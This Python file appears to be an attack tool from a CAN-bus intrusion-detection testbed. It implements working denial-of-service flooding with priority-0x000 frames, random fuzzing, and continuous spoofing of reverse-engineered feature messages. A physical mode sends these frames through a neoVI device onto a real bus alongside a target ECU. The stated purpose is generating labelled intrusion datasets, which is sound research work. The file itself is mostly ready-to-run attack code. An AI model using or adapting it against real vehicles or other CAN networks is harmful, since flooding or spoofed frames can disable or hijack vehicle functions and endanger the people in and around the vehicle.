import argparse
import can
import os
import sys
import time
import random

from attacks.reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
from can_network import VCAN_ATTACKER_CHANNEL, bus_kwargs
from can_network.bus_config import CAN_INTERFACE

# ---------------------------------------------------------------------------
# Live status display
# ---------------------------------------------------------------------------

_RESET  = "\033[0m"
_RED    = "\033[91m"
_YELLOW = "\033[93m"
_CYAN   = "\033[96m"
_DIM    = "\033[2m"
_SEP    = _DIM + "\u2500" * 44 + _RESET

_status_lines = 0


def _print_status(attack_type: str, feature: str, sent: int, rate: float, last_msg: can.Message):
    global _status_lines
    data_str = " ".join(f"{b:02X}" for b in last_msg.data)
    lines = [
        _SEP,
        f"Attack type : {_RED}{attack_type}{_RESET}",
        f"Feature     : {_YELLOW}{feature}{_RESET}",
        f"Sent        : {_CYAN}{sent}{_RESET}",
        f"Rate        : {_CYAN}{rate:.2f} msg/s{_RESET}",
        f"Last msg    : ID={_CYAN}0x{last_msg.arbitration_id:03X}{_RESET}"
        f"  DLC={last_msg.dlc}"
        f"  DATA={_CYAN}{data_str}{_RESET}",
        _SEP,
    ]
    if _status_lines > 0:
        sys.stdout.write(f"\033[{_status_lines}A")
        for _ in range(_status_lines):
            sys.stdout.write("\033[2K\n")
        sys.stdout.write(f"\033[{_status_lines}A")
    sys.stdout.write("\n".join(lines) + "\n")
    sys.stdout.flush()
    _status_lines = len(lines)


# ---------------------------------------------------------------------------
# Attack functions
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Attack functions
#
# Each loop is reused by both the standalone CLI (main() below) and the in-window
# attack-terminal panel (gui/attack_terminal.py), so they take a few keyword-only knobs:
#   stop_event   - set() to break the loop (the CLI passes None and stops with Ctrl-C).
#   send_channel - channel/netid stamped on each frame; needed on the neovi backend when
#                  one bus handle carries several channels (e.g. SharedPhysicalBus). None
#                  on socketcan or a single-channel neovi open.
#   send_timeout - timeout passed to bus.send(); must be 0 on neovi (see CAN_Network._send:
#                  NeoViBus reinterprets it as a device-ACK wait and treats None as "forever").
#   on_status    - callback(attack_type, feature, sent, rate, last_msg) for display; defaults
#                  to the CLI's live ANSI status block.
# ---------------------------------------------------------------------------

def _keep_running(stop_event):
    return stop_event is None or not stop_event.is_set()


def denial_of_service_func(bus, period: float, *, stop_event=None, send_channel=None,
                           send_timeout=None, on_status=_print_status):
    """Flood the CAN bus with high-priority empty frames at the given period."""
    sent = 0
    t0 = time.monotonic()
    while _keep_running(stop_event):
        msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                          is_extended_id=False, channel=send_channel)
        bus.send(msg, timeout=send_timeout)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        on_status("Denial of Service", "0x000", sent, sent / elapsed, msg)
        time.sleep(period)


def fuzzy_attack_func(bus, *, stop_event=None, send_channel=None,
                      send_timeout=None, on_status=_print_status):
    """Send random known-valid CAN messages at random intervals."""
    known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    sent = 0
    t0 = time.monotonic()
    while _keep_running(stop_event):
        sleep_time = random.uniform(0.5, 1.0)
        attack = random.choice(known_attacks)
        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[attack]
        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'],
                          is_extended_id=False, channel=send_channel)
        bus.send(msg, timeout=send_timeout)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        on_status("Fuzzy", attack, sent, sent / elapsed, msg)
        time.sleep(sleep_time)


def spoofing_attacks_func(bus, feature: str, period: float, *, stop_event=None,
                          send_channel=None, send_timeout=None, on_status=_print_status):
    """Continuously inject a spoofed CAN message for the given feature."""
    selected_feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
    sent = 0
    t0 = time.monotonic()
    while _keep_running(stop_event):
        msg = can.Message(arbitration_id=selected_feature['id'], data=selected_feature['payload'],
                          is_extended_id=False, channel=send_channel)
        bus.send(msg, timeout=send_timeout)
        sent += 1
        elapsed = time.monotonic() - t0 or 1e-9
        on_status("Spoofing", feature, sent, sent / elapsed, msg)
        time.sleep(period)


def available_features():
    """Everything accepted by --feature: every spoofable feature, plus fuzzy and DoS."""
    return [*FEATURE_CAN_ID_PAYLOAD_MAPPER.keys(), "fuzzy", "denial_of_service"]


def send_timeout_for_mode():
    """bus.send() timeout for the active backend: 0 on neovi (required, see the attack-function
    docstring), None (blocking) on socketcan/vcan to preserve prior CLI behaviour."""
    return 0 if CAN_INTERFACE == "neovi" else None


class _AttackArgError(Exception):
    """Raised by the non-exiting parser instead of calling sys.exit(), so a bad command typed
    into the in-window attack terminal can't tear down the pygame process."""


def build_parser(exit_on_error=True):
    """The attacks CLI parser, shared by main() and the in-window terminal. With
    exit_on_error=False it raises _AttackArgError instead of exiting the process."""
    kwargs = dict(
        description="Perform CAN network attacks.",
        epilog="Virtual mode (default): attacker frames are sent on vcan1 (default channel), which "
        "bridges to vcan0 via vxcan/can-gw so candump marks them as 'R' (received) for labeled "
        "datasets. Physical mode: export CAN_INTERFACE=neovi in this shell, then pass --channel "
        "(e.g. HSCAN) and --can-serial to send attack frames directly onto that Intrepid device's "
        "channel — no bridge is needed, the attacker is just another node on the same physical bus "
        "as the target ECU.",
    )
    if exit_on_error:
        parser = argparse.ArgumentParser(**kwargs)
    else:
        class _NonExitingParser(argparse.ArgumentParser):
            def error(self, message):
                raise _AttackArgError(message)

            def exit(self, status=0, message=None):
                raise _AttackArgError((message or "").strip())

        parser = _NonExitingParser(add_help=False, **kwargs)

    parser.add_argument("--feature", choices=available_features(), help="Feature to attack")
    parser.add_argument("--period", type=float, default=0.1, help="Period between messages in seconds")
    parser.add_argument(
        "--channel",
        default=VCAN_ATTACKER_CHANNEL,
        help=f"CAN channel/interface name for the attacker bus, virtual or physical "
        f"(default: {VCAN_ATTACKER_CHANNEL})",
    )
    parser.add_argument(
        "--can-serial",
        default=None,
        help="Serial number of the physical CAN device (physical mode only; defaults to the "
        "CAN_SERIAL env var, then auto-detect)",
    )
    return parser


def main():
    print("CAN network attacks CLI")
    parser = build_parser()
    args = parser.parse_args()
    if not args.feature:
        print("No feature specified. Use --feature to select a feature.")
        return
    can_serial = args.can_serial or os.environ.get("CAN_SERIAL")
    if can_serial and CAN_INTERFACE != "neovi":
        print(
            f"--can-serial '{can_serial}' was given, but CAN_INTERFACE is '{CAN_INTERFACE}' "
            f"(not 'neovi'), so it would be silently ignored and this would try (and fail) to "
            f"open '{args.channel}' as a {CAN_INTERFACE} interface instead. Run "
            f"'export CAN_INTERFACE=neovi' in this shell before using --can-serial. "
            f"Run 'python3 list_can_devices.py' to see connected devices and their serials."
        )
        return
    bus = can.interface.Bus(**bus_kwargs(args.channel, serial=args.can_serial))
    send_timeout = send_timeout_for_mode()

    try:
        if args.feature == "fuzzy":
            print(f"Starting fuzzy attack…\n")
            fuzzy_attack_func(bus, send_timeout=send_timeout)
        elif args.feature == "denial_of_service":
            print(f"Starting denial-of-service attack (period={args.period}s)…\n")
            denial_of_service_func(bus, args.period, send_timeout=send_timeout)
        else:
            print(f"Starting spoofing attack on '{args.feature}' (period={args.period}s)…\n")
            spoofing_attacks_func(bus, args.feature, args.period, send_timeout=send_timeout)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
